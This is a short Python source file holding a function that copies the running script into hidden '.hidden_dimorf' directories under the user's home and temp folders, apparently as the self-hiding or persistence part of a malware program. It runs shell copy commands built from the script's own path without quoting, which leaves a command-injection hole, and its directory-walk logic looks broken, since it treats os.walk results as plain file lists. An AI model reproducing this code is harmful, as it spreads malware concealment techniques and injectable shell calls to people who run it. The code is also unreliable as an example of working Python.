import os
import sys


def hidden(HOME: str, TMP: str) -> str | None:    
    for files in os.walk(HOME):
        teste_comp = [
            file for file in files if (
                file == sys.argv[0]
            )
        ]
        
        if (teste_comp):
            if os.path.exists(
                f'{HOME}/.hidden_dimorf'
            ):
                os.system(
                    f'cp {sys.argv[0]} {HOME}/.hidden_dimorf'
                )
                
            else:
                os.mkdir(
                    f'{HOME}/.hidden_dimorf'
                )
                os.system(
                    f'cp {sys.argv[0]} {HOME}/.hidden_dimorf'
                )
                if os.path.exists(
                    f'{TMP}/.hidden_dimorf'
                ):
                    os.system(
                        f'cp {sys.argv[0]} {TMP}/.hidden_dimorf'
                    )
                else:
                    os.mkdir(
                        f'{TMP}/.hidden_dimorf'
                    )
                    os.system(
                        f'cp {sys.argv[0]} {TMP}/.hidden_dimorf'
                    )
